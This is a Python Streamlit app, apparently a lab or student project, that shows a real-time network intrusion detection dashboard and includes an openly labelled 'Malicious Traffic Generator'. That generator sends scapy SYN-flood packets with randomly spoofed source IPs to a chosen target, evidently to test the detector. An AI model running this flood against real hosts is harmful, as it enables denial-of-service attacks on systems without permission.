import streamlit as st
import threading
import time
from real_time_monitor import RealTimeNetworkMonitor
import pandas as pd
import altair as alt
from scapy.all import IP, TCP, send
import random

# Global variables
monitor = None
monitor_thread = None
is_monitoring = False
alerts = []
is_generating = False

def run_monitor():
    global monitor, is_monitoring
    if monitor:
        monitor.start_monitoring(duration=None)
    is_monitoring = False

def start_monitoring():
    global monitor, monitor_thread, is_monitoring, alerts
    if not is_monitoring:
        alerts.clear()
        monitor = RealTimeNetworkMonitor(alerts_list=alerts)
        is_monitoring = True
        monitor_thread = threading.Thread(target=run_monitor, daemon=True)
        monitor_thread.start()

def stop_monitoring():
    global is_monitoring
    is_monitoring = False

def generate_syn_flood(target_ip, target_port, num_packets, delay):
    """Generate SYN flood attack"""
    global is_generating
    is_generating = True
    sent = 0
    while is_generating and sent < num_packets:
        # Create SYN packet
        ip = IP(src=".".join(map(str, (random.randint(0, 255) for _ in range(4)))), dst=target_ip)
        tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        packet = ip / tcp

        # Send packet
        send(packet, verbose=0)
        sent += 1
        time.sleep(delay)

    st.success(f"Sent {sent} SYN packets to {target_ip}:{target_port}")

def main():
    st.title("🛡️ Real-Time Network Intrusion Detection (Streamlit)")

    col1, col2 = st.columns(2)
    with col1:
        if st.button("Start Monitoring"):
            start_monitoring()
    with col2:
        if st.button("Stop Monitoring"):
            stop_monitoring()

    if monitor:
        stats = monitor.stats
        st.subheader("Monitoring Statistics")
        st.write(f"Total Packets Processed: {stats['total_packets']}")
        st.write(f"Benign Packets: {stats['benign_packets']}")
        st.write(f"Attack Packets: {stats['attack_packets']}")
        st.write(f"Alerts Generated: {stats['alerts']}")

        # Traffic classification chart
        traffic_data = pd.DataFrame({
            'Type': ['Benign', 'Attack'],
            'Count': [stats['benign_packets'], stats['attack_packets']]
        })
        traffic_chart = alt.Chart(traffic_data).mark_arc(innerRadius=50).encode(
            theta=alt.Theta(field="Count", type="quantitative"),
            color=alt.Color(field="Type", type="nominal"),
            tooltip=['Type', 'Count']
        ).properties(width=350, height=350)
        st.altair_chart(traffic_chart)

        # Alerts display
        st.subheader("Recent Alerts")
        if alerts:
            for alert in alerts[-10:][::-1]:
                st.markdown(f"**Time:** {alert['timestamp']}  \n"
                            f"**Attack:** {alert['attack_type']}  \n"
                            f"**Confidence:** {alert['confidence']:.2f}  \n"
                            f"**Details:** {alert['details']}")
        else:
            st.write("No alerts yet.")

    # Malicious Traffic Generator
    st.subheader("🚨 Malicious Traffic Generator")
    col3, col4 = st.columns(2)
    with col3:
        target_ip = st.text_input("Target IP Address", value="192.168.1.12")
        target_port = st.number_input("Target Port", value=80, min_value=1, max_value=65535)
    with col4:
        num_packets = st.number_input("Number of Packets", value=100, min_value=1)
        delay = st.number_input("Delay between packets (seconds)", value=0.1, min_value=0.0, step=0.1)

    col5, col6 = st.columns(2)
    with col5:
        if st.button("Generate SYN Flood"):
            if target_ip and target_port:
                threading.Thread(target=generate_syn_flood, args=(target_ip, int(target_port), int(num_packets), delay), daemon=True).start()
            else:
                st.error("Please enter valid target IP and port.")
    with col6:
        if st.button("Stop Generation"):
            global is_generating
            is_generating = False

    # Periodic update
    if is_monitoring:
        time.sleep(2)
        st.rerun()

if __name__ == "__main__":
    main()
